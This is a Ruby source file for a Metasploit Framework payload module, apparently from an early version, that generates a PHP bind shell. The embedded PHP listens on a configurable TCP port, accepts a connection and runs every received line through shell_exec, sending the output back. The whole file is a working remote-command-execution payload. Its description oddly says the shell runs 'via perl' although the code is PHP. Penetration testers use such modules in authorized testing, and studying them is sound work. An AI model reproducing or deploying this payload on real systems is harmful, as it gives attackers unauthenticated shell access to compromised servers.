require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Php

module BindPhp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Bind TCP (via php)',
			'Version'       => '$Revision: 3636 $',
			'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
			'Author'        => ['diaul <diaul@devilopers.org>',],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# PHP Bind Shell
	#
	def php_bind_shell
		shell = <<-END_OF_PHP_CODE
		error_reporting(E_ALL);
	
		set_time_limit(0);
		ob_implicit_flush();

		$port = #{datastore['LPORT']};

		$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		$ret = socket_bind($sock, 0, $port);
		$ret = socket_listen($sock, 5);
		$msgsock = socket_accept($sock);

		while (true)
		{
			$command = socket_read($msgsock, 2048, PHP_NORMAL_READ);
			$output = shell_exec(substr($command, 0, -1));
			socket_write($msgsock, $output, strlen($output));
		} 
	
		socket_close($sock);
		END_OF_PHP_CODE
		
		return shell

	end


	#
	# Constructs the payload
	#
	def generate
		return super + php_bind_shell
	end
	

end

end end end end
